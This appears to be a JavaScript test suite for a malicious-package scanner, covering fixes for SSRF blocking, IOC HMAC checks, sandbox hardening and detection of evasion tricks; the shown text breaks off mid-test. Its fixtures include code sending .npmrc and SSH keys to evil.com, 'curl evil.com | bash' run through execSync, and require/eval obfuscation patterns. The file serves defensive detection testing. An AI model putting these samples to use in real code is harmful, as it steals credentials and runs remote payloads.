'use strict';

const fs = require('fs');
const path = require('path');
const os = require('os');
const { test, asyncTest, assert, assertIncludes, runScanDirect, createTempPkg, cleanupTemp } = require('../test-utils');

// ===================================================================
// FIX 1: Promise.allSettled — scanner crash doesn't kill entire scan
// ===================================================================
async function runAuditFix1Tests() {
  console.log('\n=== AUDIT FIX 1: Promise.allSettled ===\n');

  await asyncTest('FIX1: Scan succeeds even with malformed JS files', async () => {
    // Create a temp package with a valid package.json and a malformed JS file
    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-fix1-'));
    try {
      fs.writeFileSync(path.join(tmpDir, 'package.json'), JSON.stringify({
        name: 'test-fix1',
        version: '1.0.0'
      }));
      // Valid JS file with a detectable pattern
      fs.writeFileSync(path.join(tmpDir, 'index.js'),
        'const fs = require("fs");\nconst data = fs.readFileSync(".npmrc");\n');
      const result = await runScanDirect(tmpDir);
      assert(result && result.threats, 'Should return result with threats array');
      assert(Array.isArray(result.threats), 'threats should be an array');
    } finally {
      fs.rmSync(tmpDir, { recursive: true, force: true });
    }
  });

  await asyncTest('FIX1: scannerErrors field present when scanner fails', async () => {
    // Normal scan should have no scannerErrors
    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-fix1b-'));
    try {
      fs.writeFileSync(path.join(tmpDir, 'package.json'), JSON.stringify({
        name: 'test-fix1b', version: '1.0.0'
      }));
      fs.writeFileSync(path.join(tmpDir, 'clean.js'), 'console.log("hello");\n');
      const result = await runScanDirect(tmpDir);
      assert(!result.scannerErrors, 'Clean scan should have no scannerErrors');
    } finally {
      fs.rmSync(tmpDir, { recursive: true, force: true });
    }
  });

  await asyncTest('FIX1: Promise.allSettled pattern is used in index.js', async () => {
    const indexSrc = fs.readFileSync(path.join(__dirname, '../../src/index.js'), 'utf8');
    assert(indexSrc.includes('Promise.allSettled'), 'Should use Promise.allSettled');
    assert(!indexSrc.includes('Promise.all(['), 'Should NOT use Promise.all for scanners');
    assert(indexSrc.includes('SCANNER_NAMES'), 'Should have SCANNER_NAMES for error reporting');
  });
}

// ===================================================================
// FIX 2: Depth limit in tryFoldConcat
// ===================================================================
async function runAuditFix2Tests() {
  console.log('\n=== AUDIT FIX 2: tryFoldConcat depth limit ===\n');

  test('FIX2: Normal string concat still works', () => {
    const { deobfuscate } = require('../../src/scanner/deobfuscate.js');
    const result = deobfuscate("const x = 'child' + '_' + 'process';");
    assert(result.code.includes("'child_process'"), 'Should fold simple string concat');
  });

  test('FIX2: Deeply nested concat returns null (no stack overflow)', () => {
    const { deobfuscate } = require('../../src/scanner/deobfuscate.js');
    // Build a deeply nested BinaryExpression: 'a' + ('b' + ('c' + ... 200 levels))
    let code = "'a'";
    for (let i = 0; i < 200; i++) {
      code = `(${code} + 'x')`;
    }
    code = `const deep = ${code};`;
    // Should not throw — should gracefully handle deep nesting
    let threw = false;
    try {
      const result = deobfuscate(code);
      // Result should either fold (up to limit) or return unchanged
      assert(result && typeof result.code === 'string', 'Should return valid result');
    } catch (e) {
      threw = true;
    }
    assert(!threw, 'Should NOT throw stack overflow on deep nesting');
  });

  test('FIX2: 100-level nesting still folds correctly', () => {
    const { deobfuscate } = require('../../src/scanner/deobfuscate.js');
    // Build a 50-level concat (well under limit)
    let code = "'a'";
    for (let i = 0; i < 50; i++) {
      code = `(${code} + 'b')`;
    }
    code = `const x = ${code};`;
    const result = deobfuscate(code);
    // Should fold: 'a' + 50 × 'b' = 'a' followed by 50 'b's
    const expected = 'a' + 'b'.repeat(50);
    assert(result.code.includes(`'${expected}'`), 'Should fold 50-level concat correctly');
  });
}

// ===================================================================
// FIX 3: Block IPv6-mapped private IPs and decimal notation
// ===================================================================
async function runAuditFix3Tests() {
  console.log('\n=== AUDIT FIX 3: IPv6-mapped + decimal IP blocking ===\n');

  test('FIX3: Blocks ::ffff:192.168.1.1 (IPv6-mapped private)', () => {
    const { isAllowedDownloadRedirect } = require('../../src/shared/download.js');
    const result = isAllowedDownloadRedirect('https://[::ffff:192.168.1.1]/pkg.tgz');
    assert(!result.allowed, 'Should block ::ffff:192.168.1.1');
  });

  test('FIX3: Blocks ::ffff:10.0.0.1 (IPv6-mapped private)', () => {
    const { isAllowedDownloadRedirect } = require('../../src/shared/download.js');
    const result = isAllowedDownloadRedirect('https://[::ffff:10.0.0.1]/pkg.tgz');
    assert(!result.allowed, 'Should block ::ffff:10.0.0.1');
  });

  test('FIX3: Blocks ::ffff:172.16.0.1 (IPv6-mapped private)', () => {
    const { isAllowedDownloadRedirect } = require('../../src/shared/download.js');
    const result = isAllowedDownloadRedirect('https://[::ffff:172.16.0.1]/pkg.tgz');
    assert(!result.allowed, 'Should block ::ffff:172.16.0.1');
  });

  test('FIX3: Blocks decimal 2130706433 (127.0.0.1)', () => {
    const { isAllowedDownloadRedirect } = require('../../src/shared/download.js');
    const result = isAllowedDownloadRedirect('https://2130706433/pkg.tgz');
    assert(!result.allowed, 'Should block decimal 127.0.0.1');
  });

  test('FIX3: Blocks decimal 167772161 (10.0.0.1)', () => {
    const { isAllowedDownloadRedirect } = require('../../src/shared/download.js');
    const result = isAllowedDownloadRedirect('https://167772161/pkg.tgz');
    assert(!result.allowed, 'Should block decimal 10.0.0.1');
  });

  test('FIX3: Blocks decimal 3232235777 (192.168.1.1)', () => {
    const { isAllowedDownloadRedirect } = require('../../src/shared/download.js');
    const result = isAllowedDownloadRedirect('https://3232235777/pkg.tgz');
    assert(!result.allowed, 'Should block decimal 192.168.1.1');
  });

  test('FIX3: Still allows registry.npmjs.org', () => {
    const { isAllowedDownloadRedirect } = require('../../src/shared/download.js');
    const result = isAllowedDownloadRedirect('https://registry.npmjs.org/express/-/express-4.18.2.tgz');
    assert(result.allowed, 'Should allow registry.npmjs.org');
  });

  test('FIX3: Still blocks ::ffff:127.0.0.1 (existing)', () => {
    const { isAllowedDownloadRedirect } = require('../../src/shared/download.js');
    const result = isAllowedDownloadRedirect('https://[::ffff:127.0.0.1]/pkg.tgz');
    assert(!result.allowed, 'Should still block ::ffff:127.0.0.1');
  });

  test('FIX3: normalizeHostname exported and works', () => {
    const { normalizeHostname } = require('../../src/shared/download.js');
    assert(normalizeHostname('::ffff:192.168.1.1') === '192.168.1.1', 'Should unwrap IPv6-mapped');
    assert(normalizeHostname('::ffff:10.0.0.1') === '10.0.0.1', 'Should unwrap ::ffff:10.x');
    assert(normalizeHostname('registry.npmjs.org') === 'registry.npmjs.org', 'Should pass through normal hostnames');
  });
}

// ===================================================================
// FIX 4: HMAC verification on IOCs
// ===================================================================
async function runAuditFix4Tests() {
  console.log('\n=== AUDIT FIX 4: HMAC verification on IOCs ===\n');

  test('FIX4: generateIOCHMAC produces consistent HMAC', () => {
    const { generateIOCHMAC } = require('../../src/ioc/updater.js');
    const data = JSON.stringify({ packages: [{ name: 'evil', version: '1.0.0' }] });
    const hmac1 = generateIOCHMAC(data);
    const hmac2 = generateIOCHMAC(data);
    assert(hmac1 === hmac2, 'Same data should produce same HMAC');
    assert(typeof hmac1 === 'string', 'HMAC should be a string');
    assert(hmac1.length === 64, 'HMAC-SHA256 hex should be 64 chars');
  });

  test('FIX4: Different data produces different HMAC', () => {
    const { generateIOCHMAC } = require('../../src/ioc/updater.js');
    const hmac1 = generateIOCHMAC('{"packages":[]}');
    const hmac2 = generateIOCHMAC('{"packages":[{"name":"x"}]}');
    assert(hmac1 !== hmac2, 'Different data should produce different HMAC');
  });

  test('FIX4: verifyIOCHMAC validates correct HMAC', () => {
    const { generateIOCHMAC, verifyIOCHMAC } = require('../../src/ioc/updater.js');
    const data = '{"test":true}';
    const hmac = generateIOCHMAC(data);
    assert(verifyIOCHMAC(data, hmac) === true, 'Valid HMAC should verify');
  });

  test('FIX4: verifyIOCHMAC rejects tampered data', () => {
    const { generateIOCHMAC, verifyIOCHMAC } = require('../../src/ioc/updater.js');
    const data = '{"test":true}';
    const hmac = generateIOCHMAC(data);
    assert(verifyIOCHMAC('{"test":false}', hmac) === false, 'Tampered data should fail verification');
  });

  test('FIX4: verifyIOCHMAC rejects wrong HMAC', () => {
    const { verifyIOCHMAC } = require('../../src/ioc/updater.js');
    assert(verifyIOCHMAC('data', 'wrong_hmac') === false, 'Wrong HMAC should fail');
  });
}

// ===================================================================
// FIX 5: Async/await taint propagation in dataflow
// ===================================================================
async function runAuditFix5Tests() {
  console.log('\n=== AUDIT FIX 5: Async/await taint propagation ===\n');

  await asyncTest('FIX5: Detects await fs.promises.readFile → fetch', async () => {
    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-fix5-'));
    try {
      fs.writeFileSync(path.join(tmpDir, 'package.json'), '{"name":"fix5-test","version":"1.0.0"}');
      fs.writeFileSync(path.join(tmpDir, 'exfil.js'), `
const fs = require('fs');
const https = require('https');
async function steal() {
  const token = await fs.promises.readFile('.npmrc', 'utf8');
  https.request({ hostname: 'evil.com', method: 'POST' }, () => {}).end(token);
}
steal();
`);
      const result = await runScanDirect(tmpDir);
      const dataflowThreat = result.threats.find(t =>
        t.type === 'suspicious_dataflow' || t.type === 'async_credential_exfil'
      );
      assert(dataflowThreat, 'Should detect async credential exfiltration');
    } finally {
      fs.rmSync(tmpDir, { recursive: true, force: true });
    }
  });

  await asyncTest('FIX5: Detects Promise.then credential exfiltration', async () => {
    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-fix5b-'));
    try {
      fs.writeFileSync(path.join(tmpDir, 'package.json'), '{"name":"fix5b-test","version":"1.0.0"}');
      fs.writeFileSync(path.join(tmpDir, 'exfil.js'), `
const fs = require('fs');
const https = require('https');
fs.promises.readFile('/root/.ssh/id_rsa', 'utf8')
  .then(function(data) {
    https.request({ hostname: 'evil.com' }).end(data);
  });
`);
      const result = await runScanDirect(tmpDir);
      const dataflowThreat = result.threats.find(t =>
        t.type === 'suspicious_dataflow' || t.type === 'async_credential_exfil'
      );
      assert(dataflowThreat, 'Should detect Promise.then credential exfiltration');
    } finally {
      fs.rmSync(tmpDir, { recursive: true, force: true });
    }
  });
}

// ===================================================================
// FIX 6: Sandbox /proc/uptime and cap-drop
// ===================================================================
async function runAuditFix6Tests() {
  console.log('\n=== AUDIT FIX 6: Sandbox hardening ===\n');

  test('FIX6: Sandbox index.js has --cap-drop=ALL', () => {
    const sandboxSrc = fs.readFileSync(path.join(__dirname, '../../src/sandbox/index.js'), 'utf8');
    assert(sandboxSrc.includes("'--cap-drop=ALL'"), 'Should have --cap-drop=ALL in docker args');
  });

  test('FIX6: Sandbox blocks /proc/uptime read', () => {
    const sandboxSrc = fs.readFileSync(path.join(__dirname, '../../src/sandbox/index.js'), 'utf8');
    // Should mount fake /proc/uptime or block access
    const hasFakeUptime = sandboxSrc.includes('proc/uptime') || sandboxSrc.includes('fake-uptime');
    assert(hasFakeUptime, 'Should handle /proc/uptime spoofing');
  });
}

// ===================================================================
// FIX 7: Percentage-based FP thresholds
// ===================================================================
async function runAuditFix7Tests() {
  console.log('\n=== AUDIT FIX 7: Percentage-based FP thresholds ===\n');

  test('FIX7: Single require_cache_poison stays CRITICAL when flooding other types', () => {
    const { applyFPReductions } = require('../../src/scoring.js');
    // 1 real require_cache_poison + 20 other threats
    const threats = [
      { type: 'require_cache_poison', severity: 'CRITICAL', file: 'evil.js', message: 'cache poison' }
    ];
    // Add 20 dummy dynamic_require to simulate flooding
    for (let i = 0; i < 20; i++) {
      threats.push({ type: 'dynamic_require', severity: 'HIGH', file: `file${i}.js`, message: 'dyn req' });
    }
    applyFPReductions(threats, null, null);
    const rcp = threats.find(t => t.type === 'require_cache_poison');
    // Single hit should be HIGH (existing rule), not LOW
    assert(rcp.severity === 'HIGH', `Single require_cache_poison should be HIGH, got ${rcp.severity}`);
  });

  test('FIX7: 4 require_cache_poison does NOT downgrade to LOW when total threats < threshold ratio', () => {
    const { applyFPReductions } = require('../../src/scoring.js');
    // 4 require_cache_poison in a package with only 5 total threats
    // This is suspicious: 80% of threats are cache poison
    const threats = [
      { type: 'require_cache_poison', severity: 'CRITICAL', file: 'a.js', message: 'rcp1' },
      { type: 'require_cache_poison', severity: 'CRITICAL', file: 'b.js', message: 'rcp2' },
      { type: 'require_cache_poison', severity: 'CRITICAL', file: 'c.js', message: 'rcp3' },
      { type: 'require_cache_poison', severity: 'CRITICAL', file: 'd.js', message: 'rcp4' },
      { type: 'dangerous_exec', severity: 'HIGH', file: 'e.js', message: 'exec' }
    ];
    applyFPReductions(threats, null, null);
    const rcpThreats = threats.filter(t => t.type === 'require_cache_poison');
    const allLow = rcpThreats.every(t => t.severity === 'LOW');
    assert(!allLow, 'Should NOT downgrade all cache_poison to LOW when they dominate findings');
  });

  test('FIX7: High volume of dynamic_require in large package still downgrades', () => {
    const { applyFPReductions } = require('../../src/scoring.js');
    const threats = [];
    // 15 dynamic_require + 100 other threats (15% of total = framework pattern)
    for (let i = 0; i < 15; i++) {
      threats.push({ type: 'dynamic_require', severity: 'HIGH', file: `mod${i}.js`, message: `dyn${i}` });
    }
    for (let i = 0; i < 100; i++) {
      threats.push({ type: 'env_access', severity: 'MEDIUM', file: `src${i}.js`, message: `env${i}` });
    }
    applyFPReductions(threats, null, null);
    const dynReqs = threats.filter(t => t.type === 'dynamic_require');
    const allLow = dynReqs.every(t => t.severity === 'LOW');
    assert(allLow, 'Large package with many dynamic_require should still downgrade');
  });
}

// ===================================================================
// FIX 8: Separate TPR heuristic vs IOC in evaluate
// ===================================================================
async function runAuditFix8Tests() {
  console.log('\n=== AUDIT FIX 8: Separate TPR heuristic vs IOC ===\n');

  test('FIX8: evaluate.js exports classifyDetectionSource', () => {
    const evaluatePath = path.join(__dirname, '../../src/commands/evaluate.js');
    if (!fs.existsSync(evaluatePath)) {
      console.log('  [SKIP] evaluate.js not found');
      return;
    }
    const mod = require(evaluatePath);
    assert(typeof mod.classifyDetectionSource === 'function',
      'Should export classifyDetectionSource function');
  });

  test('FIX8: classifyDetectionSource distinguishes IOC vs heuristic', () => {
    const evaluatePath = path.join(__dirname, '../../src/commands/evaluate.js');
    if (!fs.existsSync(evaluatePath)) {
      console.log('  [SKIP] evaluate.js not found');
      return;
    }
    const { classifyDetectionSource } = require(evaluatePath);
    const iocThreats = [
      { type: 'known_malicious_package', severity: 'CRITICAL' },
      { type: 'pypi_malicious_package', severity: 'CRITICAL' }
    ];
    const heuristicThreats = [
      { type: 'dangerous_exec', severity: 'HIGH' },
      { type: 'suspicious_dataflow', severity: 'CRITICAL' }
    ];

    assert(classifyDetectionSource(iocThreats[0]) === 'ioc', 'known_malicious_package should be IOC');
    assert(classifyDetectionSource(heuristicThreats[0]) === 'heuristic', 'dangerous_exec should be heuristic');
  });
}

// ===================================================================
// FIX 9: Scan timeout (60s global, 15s per scanner)
// ===================================================================
async function runAuditFix9Tests() {
  console.log('\n=== AUDIT FIX 9: Scan timeouts ===\n');

  test('FIX9: SCANNER_TIMEOUT and SCAN_TIMEOUT constants exist', () => {
    const indexSrc = fs.readFileSync(path.join(__dirname, '../../src/index.js'), 'utf8');
    assert(indexSrc.includes('SCANNER_TIMEOUT') || indexSrc.includes('scannerTimeout'),
      'Should define per-scanner timeout');
    assert(indexSrc.includes('SCAN_TIMEOUT') || indexSrc.includes('scanTimeout'),
      'Should define global scan timeout');
  });

  await asyncTest('FIX9: Normal scan completes within timeout', async () => {
    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-fix9-'));
    try {
      fs.writeFileSync(path.join(tmpDir, 'package.json'), '{"name":"fix9","version":"1.0.0"}');
      fs.writeFileSync(path.join(tmpDir, 'index.js'), 'console.log("ok");');
      const t0 = Date.now();
      const result = await runScanDirect(tmpDir);
      const elapsed = Date.now() - t0;
      assert(result && result.threats, 'Should return valid result');
      assert(elapsed < 60000, 'Normal scan should complete well within 60s timeout');
    } finally {
      fs.rmSync(tmpDir, { recursive: true, force: true });
    }
  });
}

// ===================================================================
// FIX 10: Track let/var, destructuring, function params in AST
// ===================================================================
async function runAuditFix10Tests() {
  console.log('\n=== AUDIT FIX 10: Extended variable tracking ===\n');

  await asyncTest('FIX10: Detects let variable with dangerous command', async () => {
    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-fix10a-'));
    try {
      fs.writeFileSync(path.join(tmpDir, 'package.json'), '{"name":"fix10a","version":"1.0.0"}');
      fs.writeFileSync(path.join(tmpDir, 'evil.js'), `
const { execSync } = require('child_process');
let cmd = 'curl http://evil.com | bash';
execSync(cmd);
`);
      const result = await runScanDirect(tmpDir);
      const execThreat = result.threats.find(t =>
        t.type === 'dangerous_exec' || t.type === 'dangerous_call_exec'
      );
      assert(execThreat, 'Should detect dangerous command in let variable');
    } finally {
      fs.rmSync(tmpDir, { recursive: true, force: true });
    }
  });

  await asyncTest('FIX10: Detects destructured exec with dangerous pattern', async () => {
    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-fix10b-'));
    try {
      fs.writeFileSync(path.join(tmpDir, 'package.json'), '{"name":"fix10b","version":"1.0.0"}');
      fs.writeFileSync(path.join(tmpDir, 'evil.js'), `
const { execSync } = require('child_process');
const cmd = 'curl http://evil.com/install.sh | bash';
execSync(cmd);
`);
      const result = await runScanDirect(tmpDir);
      const execThreat = result.threats.find(t =>
        t.type === 'dangerous_exec'
      );
      assert(execThreat, 'Should detect dangerous exec with const cmd pattern');
    } finally {
      fs.rmSync(tmpDir, { recursive: true, force: true });
    }
  });

  await asyncTest('FIX10: Detects var variable with workflow path', async () => {
    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-fix10c-'));
    try {
      fs.writeFileSync(path.join(tmpDir, 'package.json'), '{"name":"fix10c","version":"1.0.0"}');
      fs.writeFileSync(path.join(tmpDir, 'evil.js'), `
const fs = require('fs');
const path = require('path');
var wfPath = path.join('.github', 'workflows', 'ci.yml');
fs.writeFileSync(wfPath, 'malicious workflow content');
`);
      const result = await runScanDirect(tmpDir);
      const wfThreat = result.threats.find(t => t.type === 'workflow_write');
      assert(wfThreat, 'Should detect workflow write via var variable');
    } finally {
      fs.rmSync(tmpDir, { recursive: true, force: true });
    }
  });
}

// ===================================================================
// CRITICAL #10: Native addon detection + /proc/uptime spoofing
// ===================================================================
async function runCritical10Tests() {
  console.log('\n=== CRITICAL #10: Native addon detection + /proc/uptime spoofing ===\n');

  test('C10: preload.js intercepts process.dlopen', () => {
    const preloadSrc = fs.readFileSync(path.join(__dirname, '../../docker/preload.js'), 'utf8');
    assert(preloadSrc.includes('process.dlopen'), 'Should patch process.dlopen');
    assert(preloadSrc.includes('NATIVE_ADDON'), 'Should log NATIVE_ADDON category');
  });

  test('C10: preload.js intercepts /proc/uptime reads', () => {
    const preloadSrc = fs.readFileSync(path.join(__dirname, '../../docker/preload.js'), 'utf8');
    assert(preloadSrc.includes('/proc/uptime'), 'Should handle /proc/uptime reads');
    assert(preloadSrc.includes('SPOOFED'), 'Should log spoofed uptime');
  });

  test('C10: analyzer.js handles NATIVE_ADDON log lines', () => {
    const { analyzePreloadLog } = require('../../src/sandbox/analyzer.js');
    const log = '[PRELOAD] NATIVE_ADDON: process.dlopen: /sandbox/install/node_modules/sharp/build/Release/sharp-linux-x64.node (t+150ms)\n';
    const result = analyzePreloadLog(log);
    assert(result.score > 0, 'Should score native addon loading');
    const finding = result.findings.find(f => f.type === 'sandbox_native_addon_load');
    assert(finding, 'Should produce sandbox_native_addon_load finding');
    assert(finding.severity === 'MEDIUM', 'Native addon finding should be MEDIUM');
  });

  test('C10: analyzer.js ignores empty NATIVE_ADDON lines', () => {
    const { analyzePreloadLog } = require('../../src/sandbox/analyzer.js');
    const log = '[PRELOAD] INIT: Preload active. TIME_OFFSET=0ms (0.0h). PID=1\n';
    const result = analyzePreloadLog(log);
    const finding = result.findings.find(f => f.type === 'sandbox_native_addon_load');
    assert(!finding, 'Should not produce finding without NATIVE_ADDON lines');
  });
}

// ===================================================================
// CRITICAL #15: Atomic writes in monitor.js
// ===================================================================
async function runCritical15Tests() {
  console.log('\n=== CRITICAL #15: Atomic writes in monitor.js ===\n');

  test('C15: atomicWriteFileSync exported from monitor', () => {
    const { atomicWriteFileSync } = require('../../src/monitor.js');
    assert(typeof atomicWriteFileSync === 'function', 'Should export atomicWriteFileSync');
  });

  test('C15: atomicWriteFileSync writes and renames correctly', () => {
    const { atomicWriteFileSync } = require('../../src/monitor.js');
    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-c15-'));
    try {
      const target = path.join(tmpDir, 'test-atomic.json');
      const data = JSON.stringify({ test: true, ts: Date.now() });
      atomicWriteFileSync(target, data);
      assert(fs.existsSync(target), 'Target file should exist');
      assert(!fs.existsSync(target + '.tmp'), 'Temp file should be removed after rename');
      const read = fs.readFileSync(target, 'utf8');
      assert(read === data, 'Written data should match');
    } finally {
      fs.rmSync(tmpDir, { recursive: true, force: true });
    }
  });

  test('C15: atomicWriteFileSync creates parent directory', () => {
    const { atomicWriteFileSync } = require('../../src/monitor.js');
    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-c15b-'));
    try {
      const target = path.join(tmpDir, 'nested', 'dir', 'test.json');
      atomicWriteFileSync(target, '{"ok":true}');
      assert(fs.existsSync(target), 'Should create nested directories and write file');
    } finally {
      fs.rmSync(tmpDir, { recursive: true, force: true });
    }
  });

  test('C15: monitor.js uses atomic writes for data files', () => {
    const monitorSrc = fs.readFileSync(path.join(__dirname, '../../src/monitor.js'), 'utf8');
    // Count non-atomic writeFileSync calls (exclude the atomicWriteFileSync definition and STATE_FILE)
    const nonAtomicWrites = monitorSrc.match(/fs\.writeFileSync\([A-Z_]+FILE/g) || [];
    assert(nonAtomicWrites.length === 0,
      'All data file writes should use atomicWriteFileSync, found: ' + nonAtomicWrites.length + ' non-atomic writes');
  });
}

// ===================================================================
// CRITICAL #18: AST bypass techniques
// ===================================================================
async function runCritical18Tests() {
  console.log('\n=== CRITICAL #18: AST bypass techniques ===\n');

  await asyncTest('C18: Detects eval.call(null, code)', async () => {
    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-c18a-'));
    try {
      fs.writeFileSync(path.join(tmpDir, 'package.json'), '{"name":"c18a","version":"1.0.0"}');
      fs.writeFileSync(path.join(tmpDir, 'evil.js'),
        'var code = "process.exit(1)";\neval.call(null, code);\n');
      const result = await runScanDirect(tmpDir);
      const threat = result.threats.find(t => t.type === 'dangerous_call_eval' && t.message.includes('call'));
      assert(threat, 'Should detect eval.call()');
    } finally {
      fs.rmSync(tmpDir, { recursive: true, force: true });
    }
  });

  await asyncTest('C18: Detects [require][0]("child_process")', async () => {
    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-c18b-'));
    try {
      fs.writeFileSync(path.join(tmpDir, 'package.json'), '{"name":"c18b","version":"1.0.0"}');
      fs.writeFileSync(path.join(tmpDir, 'evil.js'),
        'var cp = [require][0]("child_process");\ncp.execSync("whoami");\n');
      const result = await runScanDirect(tmpDir);
      const threat = result.threats.find(t =>
        t.type === 'dynamic_require' && t.message.includes('array access'));
      assert(threat, 'Should detect [require][0]() array access evasion');
    } finally {
      fs.rmSync(tmpDir, { recursive: true, force: true });
    }
  });

  await asyncTest('C18: Detects obj.exec = require("child_process").exec', async () => {
    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-c18c-'));
    try {
      fs.writeFileSync(path.join(tmpDir, 'package.json'), '{"name":"c18c","version":"1.0.0"}');
      fs.writeFileSync(path.join(tmpDir, 'evil.js'),
        'var obj = {};\nobj.run = require("child_process").exec;\nobj.run("whoami");\n');
      const result = await runScanDirect(tmpDir);
      const threat = result.threats.find(t =>
        t.message.includes('Object property indirection') || t.message.includes('hiding exec'));
      assert(threat, 'Should detect object property indirection for exec');
    } finally {
      fs.rmSync(tmpDir, { recursive: true, force: true });
    }
  });

  await asyncTest('C18: Detects new Proxy(require, handler)', async () => {
    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-c18d-'));
    try {
      fs.writeFileSync(path.join(tmpDir, 'package.json'), '{"name":"c18d","version":"1.0.0"}');
      fs.writeFileSync(path.join(tmpDir, 'evil.js'),
        'var r = new Proxy(require, { apply: function(t, c, a) { return t.apply(c, a); } });\nr("child_process").execSync("id");\n');
      const result = await runScanDirect(tmpDir);
      const threat = result.threats.find(t =>
        t.type === 'dynamic_require' && t.message.includes('Proxy'));
      assert(threat, 'Should detect new Proxy(require)');
    } finally {
      fs.rmSync(tmpDir, { recursive: true, force: true });
    }
  });

  await asyncTest('C18: Detects with(require("child_process")) exec(cmd)', async () => {
    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-c18e-'));
    try {
      fs.writeFileSync(path.join(tmpDir, 'package.json'), '{"name":"c18e","version":"1.0.0"}');
      // with() only works in non-strict mode (sloppy mode scripts)
      fs.writeFileSync(path.join(tmpDir, 'evil.js'),
        'with(require("child_process")) { execSync("whoami"); }\n');
      const result = await runScanDirect(tmpDir);
      const threat = result.threats.find(t =>
        t.type === 'dangerous_exec' && t.message.includes('with('));
      assert(threat, 'Should detect with(require()) scope injection');
    } finally {
      fs.rmSync(tmpDir, { recursive: true, force: true });
    }
  });

  await asyncTest('C18: Detects template literal in execSync', async () => {
    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-c18f-'));
    try {
      fs.writeFileSync(path.join(tmpDir, 'package.json'), '{"name":"c18f","version":"1.0.0"}');
      fs.writeFileSync(path.join(tmpDir, 'evil.js'),
        'const { execSync } = require("child_process");\nvar host = "evil.com";\nexecSync(`curl ${host}/payload | bash`);\n');
      const result = await runScanDirect(tmpDir);
      const threat = result.threats.find(t =>
        t.type === 'dangerous_exec');
      assert(threat, 'Should detect dangerous command in template literal exec');
    } finally {
      fs.rmSync(tmpDir, { recursive: true, force: true });
    }
  });

  await asyncTest('C18: Detects import("child_process") dynamic import', async () => {
    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-c18g-'));
    try {
      fs.writeFileSync(path.join(tmpDir, 'package.json'), '{"name":"c18g","version":"1.0.0"}');
      fs.writeFileSync(path.join(tmpDir, 'evil.mjs'),
        'const cp = await import("child_process");\ncp.execSync("id");\n');
      const result = await runScanDirect(tmpDir);
      const threat = result.threats.find(t =>
        t.type === 'dynamic_import' && t.message.includes('child_process'));
      assert(threat, 'Should detect dynamic import of child_process');
    } finally {
      fs.rmSync(tmpDir, { recursive: true, force: true });
    }
  });
}

// ===================================================================
// HIGH #3: Benign set biaisé — native addon packages in packages-npm.txt
// ===================================================================
async function runHighFix3Tests() {
  console.log('\n=== HIGH #3: Benign set native addon packages ===\n');

  test('H3: packages-npm.txt contains native addon packages', () => {
    const npmList = fs.readFileSync(
      path.join(__dirname, '../../datasets/benign/packages-npm.txt'), 'utf8'
    );
    const lines = npmList.split('\n').map(l => l.trim()).filter(l => l && !l.startsWith('#'));
    const nativeAddons = ['leveldown', 'sodium-native', 'cpu-features'];
    for (const pkg of nativeAddons) {
      assert(lines.includes(pkg), `packages-npm.txt should contain ${pkg}`);
    }
  });

  test('H3: packages-npm.txt has at least 3 native addon packages', () => {
    const npmList = fs.readFileSync(
      path.join(__dirname, '../../datasets/benign/packages-npm.txt'), 'utf8'
    );
    const knownNative = ['bcrypt', 'canvas', 'sqlite3', 'better-sqlite3', 'leveldown',
      'sodium-native', 'cpu-features', 'sharp', 'node-gyp'];
    const lines = npmList.split('\n').map(l => l.trim()).filter(l => l && !l.startsWith('#'));
    const found = knownNative.filter(p => lines.includes(p));
    assert(found.length >= 3, `Should have at least 3 native addon packages, found ${found.length}: ${found.join(', ')}`);
  });
}

// ===================================================================
// HIGH #4: PyPI evaluation (0 tests PyPI)
// ===================================================================
async function runHighFix4Tests() {
  console.log('\n=== HIGH #4: PyPI evaluation support ===\n');

  test('H4: packages-pypi.txt exists and contains packages', () => {
    const pypiPath = path.join(__dirname, '../../datasets/benign/packages-pypi.txt');
    assert(fs.existsSync(pypiPath), 'packages-pypi.txt should exist');
    const content = fs.readFileSync(pypiPath, 'utf8');
    const lines = content.split('\n').map(l => l.trim()).filter(l => l && !l.startsWith('#'));
    assert(lines.length >= 10, `Should have at least 10 PyPI packages, got ${lines.length}`);
  });

  test('H4: evaluate.js exports evaluateBenignPyPI', () => {
    const { evaluateBenignPyPI } = require('../../src/commands/evaluate.js');
    assert(typeof evaluateBenignPyPI === 'function', 'Should export evaluateBenignPyPI function');
  });
}

// ===================================================================
// HIGH #7: DNS rebinding protection
// ===================================================================
async function runHighFix7Tests() {
  console.log('\n=== HIGH #7: DNS rebinding protection ===\n');

  test('H7: isPrivateIP blocks 127.0.0.1', () => {
    const { isPrivateIP } = require('../../src/shared/download.js');
    assert(isPrivateIP('127.0.0.1') === true, 'Should block 127.0.0.1');
  });

  test('H7: isPrivateIP blocks 10.0.0.1', () => {
    const { isPrivateIP } = require('../../src/shared/download.js');
    assert(isPrivateIP('10.0.0.1') === true, 'Should block 10.0.0.1');
  });

  test('H7: isPrivateIP blocks 192.168.1.1', () => {
    const { isPrivateIP } = require('../../src/shared/download.js');
    assert(isPrivateIP('192.168.1.1') === true, 'Should block 192.168.1.1');
  });

  test('H7: isPrivateIP allows public IPs', () => {
    const { isPrivateIP } = require('../../src/shared/download.js');
    assert(isPrivateIP('8.8.8.8') === false, 'Should allow 8.8.8.8');
    assert(isPrivateIP('104.16.0.1') === false, 'Should allow 104.16.0.1');
  });

  test('H7: safeDnsResolve exported', () => {
    const { safeDnsResolve } = require('../../src/shared/download.js');
    assert(typeof safeDnsResolve === 'function', 'Should export safeDnsResolve');
  });

  await asyncTest('H7: safeDnsResolve rejects private IP literals', async () => {
